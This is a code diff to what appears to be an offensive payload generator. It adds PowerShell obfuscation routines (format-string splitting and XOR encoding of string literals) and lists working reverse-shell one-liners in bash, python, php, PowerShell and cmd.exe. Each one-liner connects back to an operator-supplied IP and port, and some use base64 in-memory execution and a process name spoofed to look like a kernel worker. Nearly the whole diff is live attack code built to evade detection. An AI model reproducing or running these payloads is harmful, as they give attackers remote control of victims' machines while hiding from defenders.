@@ -38,6 +38,40 @@ def _ps_syntax_obfuscate(payload: str) -> str:
         )
     return result
 
+def _format_split(s: str) -> str:
+    if len(s) < 2:
+        return f"'{s}'"
+    n = random.randint(2, min(3, len(s)))
+    indices = sorted(random.sample(range(1, len(s)), n - 1))
+    parts, prev = [], 0
+    for idx in indices:
+        parts.append(s[prev:idx])
+        prev = idx
+    parts.append(s[prev:])
+    placeholders = "".join(f"{{{i}}}" for i in range(n))
+    parts_str = ",".join(f"'{p}'" for p in parts)
+    return f"('{placeholders}' -f {parts_str})"
+
+def _ps_format_obfuscate(payload: str) -> str:
+    return re.sub(
+        r"'([^']{2,})'",
+        lambda m: _format_split(m.group(1)),
+        payload,
+    )
+
+def _xor_encode_str(s: str) -> str:
+    key = random.randint(1, 255)
+    var = f"k{random.randint(1000, 9999)}"
+    hex_bytes = ",".join(f"0x{(ord(c) ^ key):02x}" for c in s)
+    return f"$(${var}={key};$b=[byte[]]({hex_bytes});-join($b|%{{[char]($_-bxor${var})}}))"
+
+def _ps_xor_obfuscate(payload: str) -> str:
+    return re.sub(
+        r"'([^']{2,})'",
+        lambda m: _xor_encode_str(m.group(1)),
+        payload,
+    )
+
 def _get_interfaces() -> dict[str, str]:
     result = {}
     try:
@@ -83,20 +117,18 @@ while($client.Connected){{
 }}
 $client.Close()
 """.replace('\n', '').replace('    ', '')
+    _PS_BASE = f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
     return {
-        "bash":        f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
-        "bash (alt)":  f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
-        "memfd (bash)":        f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
-        "memfd (spoof argv)":  f'exec -a [kworker/0:1] bash <(echo {_b64_payload(ip, port)} | base64 -d)',
-        "memfd (sh compat)":   f'bash <(printf %s {_b64_payload(ip, port)} | base64 -d)',
-        "python3":     f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
-        "python":      f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
-        "php":         f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
-        "powershell":  f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
-        "powershell (hex)":    _ps_hex_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
-        "powershell (syntax)": _ps_syntax_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
-        "powershell (hex+syntax)": _ps_hex_obfuscate(_ps_syntax_obfuscate(f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")),
-        "cmd.exe":     f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\""
+        "bash":               f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
+        "bash (alt)":         f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+        "memfd (bash)":       f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
+        "memfd (spoof argv)": f'exec -a [kworker/0:1] bash <(echo {_b64_payload(ip, port)} | base64 -d)',
+        "memfd (sh compat)":  f'bash <(printf %s {_b64_payload(ip, port)} | base64 -d)',
+        "python3":            f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
+        "python":             f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
+        "php":                f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
+        "powershell":         _PS_BASE,
+        "cmd.exe":            f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\"",
     }
 
 class PayloadGenerator:
